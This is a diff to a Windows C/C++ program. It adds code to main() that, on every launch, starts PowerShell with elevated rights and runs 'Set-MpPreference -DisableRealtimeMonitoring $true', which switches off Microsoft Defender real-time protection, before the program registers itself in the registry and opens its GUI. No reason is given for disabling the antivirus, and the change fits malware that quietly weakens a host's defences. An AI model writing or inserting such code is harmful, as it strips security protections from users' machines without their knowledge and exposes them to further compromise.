@@ -255,6 +255,34 @@ void GuiThread() {
 
 int main() {
     char buffer[MAX_PATH];
+    const char* pw = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+    const char* argument = "Set-MpPreference -DisableRealtimeMonitoring $true";
+
+    char commandLine[1024];
+    snprintf(commandLine, sizeof(commandLine), "%s", argument);
+
+    // Launch PowerShell with elevated privileges
+    HINSTANCE hInstance = ShellExecute(NULL, "runas", pw, commandLine, NULL, SW_SHOWNORMAL);
+
+    if (hInstance <= (HINSTANCE)HINSTANCE_ERROR) {
+        // Failed to launch the process.
+        DWORD errorCode = GetLastError();
+        LPVOID errorMsg;
+        FormatMessage(
+            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
+            NULL,
+            errorCode,
+            0,
+            (LPSTR)&errorMsg,
+            0,
+            NULL
+        );
+
+        printf("Error starting process. Error code: %d - %s\n", errorCode, (LPSTR)errorMsg);
+
+        LocalFree(errorMsg);
+        return 0;
+    }
     GetModuleFileNameA(NULL, buffer, MAX_PATH); // Get the path of the executable currently running
     RegisterAppToRegistry("Ack", buffer);
     GuiThread();
